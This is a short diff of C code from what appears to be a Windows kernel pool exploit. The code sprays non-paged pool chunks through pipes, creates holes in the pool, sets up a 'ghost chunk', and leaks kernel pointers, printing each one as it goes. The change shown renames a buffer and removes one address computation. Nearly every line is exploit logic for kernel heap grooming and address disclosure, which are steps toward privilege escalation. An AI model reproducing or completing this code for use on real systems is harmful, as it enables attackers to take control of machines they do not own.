@@ -12,18 +12,18 @@ pipe_queue_entry_sub_t g_fake_pipe_queue_sub;
 
 void allocateNewVsSubSegment()
 {
-    char dummy_attribute[0x1000];
-    memset(dummy_attribute, 0x41, 0x1000);
+    char dummy_buf[0x1000];
+    memset(dummy_buf, 0x41, 0x1000);
 
-    SprayNPPNxChunks(0x20000, (vs_chunk_t*)dummy_attribute, VULN_BLOCK_SIZE);
+    SprayNPPNxChunks(0x20000, (vs_chunk_t*)dummy_buf, VULN_BLOCK_SIZE);
 }
 
 pipe_group_t* createChunkHoles()
 {
-    char dummy_attribute[0x1000];
-    memset(dummy_attribute, 0x41, 0x1000);
+    char dummy_buf[0x1000];
+    memset(dummy_buf, 0x41, 0x1000);
 
-    pipe_group_t* victim_chunks = SprayNPPNxChunks(SPRAY_SIZE, (vs_chunk_t*)dummy_attribute, VICTIM_BLOCK_SIZE);
+    pipe_group_t* victim_chunks = SprayNPPNxChunks(SPRAY_SIZE, (vs_chunk_t*)dummy_buf, VICTIM_BLOCK_SIZE);
 
     // Create holes
     for (size_t i = 0; i < victim_chunks->nb; i += 3)
@@ -143,9 +143,6 @@ int createGhostChunk(exploit_pipes_t* pipes, exploit_addresses_t* addrs, pipe_gr
 
             addrs->root_pipe_queue_entry = (uintptr_t)leaked_ghost_chunk_data.pipe_queue_entry.list.Flink;
             printf("[+] root_pipe_queue_entry: 0x%llX\n", addrs->root_pipe_queue_entry);
-
-            addrs->root_pipe_attribute = addrs->root_pipe_queue_entry - ROOT_PIPE_QUEUE_ENTRY_OFFSET + ROOT_PIPE_ATTRIBUTE_OFFSET;
-            printf("[+] root_pipe_attribute: 0x%llX\n", addrs->root_pipe_attribute);
 
             pipes->ghost_chunk_pipe = ghost_chunk_candidates->pipes[ghost_chunk_idx];
             printf("[+] ghost_chunk_pipe\n\tread: 0x%p\n\twrite: 0x%p\n", pipes->ghost_chunk_pipe.read, pipes->ghost_chunk_pipe.write);
